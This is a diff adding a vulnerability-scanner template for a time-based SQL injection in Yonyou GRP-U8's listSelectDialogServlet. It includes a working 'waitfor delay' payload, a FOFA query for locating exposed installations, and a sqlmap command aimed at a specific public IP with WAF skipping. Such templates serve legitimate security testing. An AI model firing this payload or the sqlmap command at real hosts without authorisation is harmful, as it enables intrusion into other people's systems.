@@ -1,0 +1,36 @@
+id: yonyou-grp-u8-listSelectDialogServlet-sqli
+info:
+  name: 用友 GRP U8 listSelectDialogServlet - sqli
+  author: leadlife
+  severity: high
+  description: 用友GRP-U8-listSelectDialogServlet存在SQL注入
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BGRP-U8-listSelectDialogServlet%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+  metadata:
+    verified: true
+    fofa-query: app="用友-GRP-U8" || title="用友GRP-U8行政事业内控管理软件" || icon_hash="-299520369"
+    sqlmap: sqlmap -u "http://116.53.156.21:8089/listSelectDialogServlet?slType=slFZX&slCdtn=1=2" --skip-waf -p slCdtn 
+  tags: yonyou,grpu8,sqli,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20%270:0:6%27 HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Origin: null
+        DNT: 1
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        SOAPAction: 
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
